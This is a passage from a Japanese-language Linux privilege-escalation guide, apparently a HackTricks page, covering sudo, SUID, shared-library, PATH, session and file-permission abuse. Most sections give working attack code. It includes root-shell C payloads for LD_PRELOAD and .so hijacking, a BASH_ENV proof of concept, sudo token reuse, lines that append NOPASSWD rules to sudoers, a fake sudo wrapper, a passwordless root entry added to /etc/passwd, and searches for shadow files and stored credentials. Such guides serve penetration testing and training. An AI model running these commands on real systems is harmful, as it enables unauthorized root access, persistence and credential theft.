cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** を持つユーザーが特権を昇格できるバグの影響を受けていました。詳細情報: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**悪用する** コマンド: **`systemd-run -t /bin/bash`**

### Groups

root 権限を付与する可能性のある**あるグループのメンバーかどうか**を確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

可能であれば、クリップボード内に興味深い内容がないか確認してください。
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

もし環境の**パスワードを知っている**なら、**各ユーザーとしてそのパスワードでログインを試してください**。

### Su Brute

ノイズが多くても気にせず、かつ対象ホストに `su` と `timeout` バイナリが存在する場合、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーをブルートフォースすることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーのブルートフォースも試みます。

## 書き込み可能な PATH の悪用

### $PATH

$PATH のいずれかのフォルダに**書き込みできる**ことが分かった場合、書き込み可能なフォルダ内に別ユーザー（理想的には root）が実行するコマンド名と同じ名前のバックドアを**作成する**ことで権限昇格できる可能性があります。ただし、そのコマンドが $PATH においてあなたの書き込み可能なフォルダよりも前にあるフォルダから**読み込まれない**ことが必要です。

### SUDO and SUID

sudo を使って実行が許可されているコマンドがあるか、もしくは suid ビットが設定されているコマンドがあるかもしれません。確認するには:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドは、ファイルを読み取りおよび／または書き込みしたり、コマンドを実行したりすることを可能にします。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

sudo の設定によっては、ユーザーが別のユーザーの権限で特定のコマンドをパスワードを知らなくても実行できることがある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例ではユーザー `demo` が `root` として `vim` を実行できるため、root directory に `ssh key` を追加するか `sh` を呼び出すことで、簡単にシェルを取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、実行中に**環境変数を設定**することをユーザーに許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**based on HTB machine Admirer** に基づくもので、スクリプトを root として実行する際に任意の python ライブラリを読み込ませる **PYTHONPATH hijacking** に **vulnerable** でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep を介して保持されると → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- なぜ動くか: 非対話型シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可しています。`BASH_ENV` が sudo によって保持されている場合、あなたのファイルは root privileges でソースされます。

- 要件:
- 実行可能な sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、あるいは任意の bash スクリプトなど）。
- `env_keep` に `BASH_ENV` が含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を推奨する。
- sudo で許可されたコマンドに対して shell ラッパーを避け、最小限のバイナリを使用する。
- 保持された環境変数が使用される場合、sudo の I/O ロギングとアラートを検討する。

### Sudo 実行のバイパス経路

**Jump** して他のファイルを読んだり、**symlinks** を使ったりする。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使用されている（\*）なら、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary がコマンドパスを指定していない場合

もし **sudo permission** が単一のコマンドに対してパスを指定せずに付与されている（例: _hacker10 ALL= (root) less_）場合、PATH 変数を変更することで悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリが**別のコマンドをパスを指定せずに実行する場合（怪しい SUID バイナリの内容は常に _**strings**_ で確認してください）**にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### コマンドパスを持つ SUID バイナリ

もし **suid** バイナリが**パスを指定して別のコマンドを実行する**なら、その suid ファイルが呼び出すコマンド名と同じ名前の関数を作成して**export**してみてください。

例えば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、関数を作成して export することを試みてください：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid バイナリを呼び出すと、この関数が実行されます

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

しかし、システムのセキュリティを維持し、特に **suid/sgid** 実行ファイルでこの機能が悪用されるのを防ぐために、システムはいくつかの条件を強制します:

- 実行ファイルの実際のユーザーID (_ruid_) が実効ユーザーID (_euid_) と一致しない場合、ローダーは **LD_PRELOAD** を無視します。
- suid/sgid を持つ実行ファイルについては、同様に suid/sgid である標準パス内のライブラリのみがプリロードされます。

Privilege escalation は、`sudo` でコマンドを実行する権限があり、かつ `sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合に発生する可能性があります。この構成により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持され認識されるため、特権が昇格した状態で任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
ファイルを **/tmp/pe.c** として保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**compile it** を使用して:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行します
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が**LD_LIBRARY_PATH** env variable を制御している場合、同様の privesc を悪用できます。ライブラリが検索されるパスを制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID バイナリ – .so injection

SUID 権限を持つバイナリに遭遇し、通常と異なるように見える場合は、正しく **.so** ファイルを読み込んでいるか確認するのが良い習慣です。次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、悪用の可能性が考えられます。

これを悪用するには、Cファイル、例えば _"/path/to/.config/libcalc.c"_ を作成し、以下のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルおよび実行されると、ファイル権限を操作して elevate privileges を目指し、elevated privileges の shell を起動します。

上記の C ファイルを共有オブジェクト (.so) ファイルにコンパイルするには、次のコマンドを使用します:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けたSUIDバイナリを実行するとエクスプロイトが発動し、システムの侵害につながる可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダからライブラリをロードするSUIDバイナリを見つけたので、そのフォルダに必要な名前でライブラリを作成します:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
それは、生成したライブラリに `a_function_name` という関数が必要であることを意味します。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリのキュレーションされたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに **引数のみを注入** できる場合に当てはまる同様のリストです。

このプロジェクトは、制限付きシェルからの脱出、権限昇格または維持、ファイル転送、spawn bind and reverse shells、その他の post-exploitation タスクを容易にするために悪用できる Unix バイナリの正規の機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して任意の sudo ルールを悪用する方法が見つかるか確認できます。

### Reusing Sudo Tokens

パスワードはわからないが **sudo access** を持っている場合、**sudo コマンドの実行を待ち、それからセッショントークンを乗っ取る**ことで権限を昇格できます。

Requirements to escalate privileges:

- すでにユーザ _sampleuser_ としてシェルを持っている
- _sampleuser_ は過去 **15分以内** に `sudo` を使用して何かを実行している（デフォルトではこれはパスワードなしで `sudo` を使える sudo トークンの有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 である
- `gdb` にアクセス可能である（アップロードできる必要があります）

(一時的に `ptrace_scope` を有効にするには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、/etc/sysctl.d/10-ptrace.conf を恒久的に変更して `kernel.yama.ptrace_scope = 0` を設定します)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- この **second exploit** (`exploit_v2.sh`) は _/tmp_ に sh shell を作成し、**root 所有で setuid が付与されます**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- その **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化して、すべてのユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダやその中で作成された任意のファイルに対して**書き込み権限**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使って**ユーザーとPIDのためのsudoトークンを作成**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、PID 1234 のそのユーザーとしてシェルを持っている場合、パスワードを知らなくても以下を実行することで**sudo権限を取得**できます：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. これらのファイルは**デフォルトで root ユーザーと root グループのみが読み取れます**.\
**もし**このファイルを**読む**ことができれば、**興味深い情報を取得できる可能性があります**、そして、もし任意のファイルに**書き込み**ができれば、**escalate privileges**することができます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込み権限があれば、それを悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として OpenBSD の `doas` などが存在します。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

特定のユーザが通常マシンに接続して `sudo` を使って権限昇格することが分かっており、かつそのユーザ権限でシェルを得ている場合、rootとして自分のコードを実行し、その後ユーザのコマンドを実行するような**新しい sudo 実行ファイル**を作成できます。次に、そのユーザコンテキストの $PATH を変更（例えば .bash_profile に新しいパスを追加）すると、ユーザが sudo を実行したときにあなたの sudo 実行ファイルが実行されます。

ユーザが別のシェル（bash 以外）を使用している場合、新しいパスを追加するために他のファイルを編集する必要があることに注意してください。例えば [sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を変更します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

または次のようなコマンドを実行する：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルがどこから来るか** を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり `/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれる、ということです。  
この設定ファイルは**他のフォルダを指します**。そこでは**ライブラリ**が**検索されます**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**これはシステムが `/usr/local/lib` 内をライブラリ検索することを意味します**。

もし何らかの理由で **ユーザーが書き込み権限を持っている** 場合、次のいずれかのパスに対して: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` の設定ファイル内で指定されている任意のフォルダ、そのユーザーは権限を昇格できる可能性があります。\
次のページで**この誤設定をどのように悪用するか**を確認してください:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
libを`/var/tmp/flag15/`にコピーすると、`RPATH`変数で指定されている通り、この場所でプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に悪意のあるライブラリを `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` で作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な root 権限の **部分集合を提供します**。これにより root の **権限をより小さく識別可能な単位に分割**することが可能になります。これらの各単位は個別にプロセスに付与できます。こうして全体の権限が縮小され、悪用のリスクが低減します。\
次のページを読んで、**capabilities とその悪用方法について詳しく学んでください**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute" ビット**は対象ユーザが "**cd**" できることを意味します。\
**"read"** ビットはユーザが **list** して**files** を見ることを意味し、**"write"** ビットはユーザが **delete** および新しい **files** を **create** できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意の権限の第二層を表し、従来の ugo/rwx パーミッションを **上書きすることができます**。これらの権限により、所有者でもグループの一員でもない特定のユーザに対して権利を許可または拒否することで、ファイルやディレクトリへのアクセス制御が強化されます。このレベルの **粒度により、より精密なアクセス管理が可能になります**。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**Give** user "kali" にファイルの read and write パーミッションを付与する:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得する** システムから特定のACLを持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 開いている shell sessions

**古いバージョン**では、別のユーザー（**root**）の**shell**セッションを**hijack**できる場合があります。\
**最新のバージョン**では、**connect**できるのは**自分のユーザー**の screen sessions のみです。しかし、**セッション内の興味深い情報**を見つけることがあるかもしれません。

### screen sessions hijacking

**screen sessions を一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは**古い tmux バージョン**の問題でした。root によって作成された tmux (v2.1) セッションを非特権ユーザーとして hijack できませんでした。

**tmux セッションの一覧**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
例として **Valentine box from HTB** を参照してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間に Debian 系のシステム（Ubuntu、Kubuntu など）で生成されたすべての SSL および SSH キーはこのバグの影響を受ける可能性があります。\
このバグはこれらの OS で新しい ssh キーを作成したときに発生し、**可能な変種がわずか 32,768 通りしかなかった**ことによります。つまり、すべての可能性を計算でき、**ssh public key を持っていれば対応する private key を検索できます**。計算済みの可能性はここで見つけられます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH の注目すべき設定値

- **PasswordAuthentication:** パスワード認証が許可されているかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、パスワードが空文字のアカウントでのログインをサーバが許可するかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh を使用してログインできるかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root はパスワードおよび private key でログインできます
- `without-password` or `prohibit-password`: root は private key のみでログインできます
- `forced-commands-only`: root は private key によるログインのみ可能で、かつ commands オプションが指定されている場合に限ります
- `no` : 許可しない

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。%h のようなトークンを含めることができ、これはホームディレクトリに置き換えられます。**絶対パスを指定できます**（`/` で始まる）または**ユーザーのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**private** key でログインを試みた場合、ssh があなたの key の public key を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、サーバー上に（パスフレーズ無しで）鍵を置いたままにする代わりに **use your local SSH keys instead of leaving keys** ことができます。したがって、ssh を経由して **jump** **to a host** し、そこから **jump to another** host **using** the **key** located in your **initial host** ことが可能になります。

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

ファイル `/etc/ssh_config` はこの **options** を **override** してこの設定を許可または拒否することができます.\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` によって ssh-agent forwarding を **allow** または **denied** に設定できます（デフォルトは allow）。

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは **scripts that are executed when a user runs a new shell** です。したがって、それらのいずれかに **write or modify any of them you can escalate privileges** できる場合、権限昇格が可能です。
```bash
ls -l /etc/profile /etc/profile.d/
```
怪しいプロファイルスクリプトが見つかった場合は、**機密情報** が含まれていないか確認してください。

### Passwd/Shadow Files

Depending on the OS the `/etc/passwd` and `/etc/shadow` files may be using a different name or there may be a backup. Therefore it's recommended **すべて見つける** and **ファイルを読み取れるか確認する**ことで、ファイル内に**hashes が含まれているか**を確認することをおすすめします:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内に**password hashes**が見つかることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、以下のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次にユーザー `hacker` を追加し、生成したパスワードを設定します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを使って `hacker:hacker` として切り替えられます

あるいは、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注: BSD プラットフォームでは `/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、`/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

いくつかの機密ファイルに**書き込みができるか**確認すべきです。例えば、いくつかの**サービス設定ファイル**に書き込みできますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバを実行しており、**modify the Tomcat service configuration file inside /etc/systemd/,** ができるなら、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたの backdoor は、tomcat が次回起動したときに実行されます。

### フォルダの確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読み取れないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでください。これは **パスワードを含む可能性のある複数のファイル** を検索します。\
**もう1つの興味深いツール** として使用できるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) です。これは Windows、Linux & Mac のローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースのアプリケーションです。

### ログ

ログを読める場合、その中に **興味深い/機密情報が含まれている** 可能性があります。ログが奇妙であればあるほど、（おそらく）より興味深いでしょう。\
また、設定が「**bad**」(バックドア化？) な一部の **audit logs** により、次の投稿で説明されているように、audit logs 内に **パスワードを記録** させることが可能になる場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むには、**ログを読む権限のあるグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) が非常に役立ちます。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
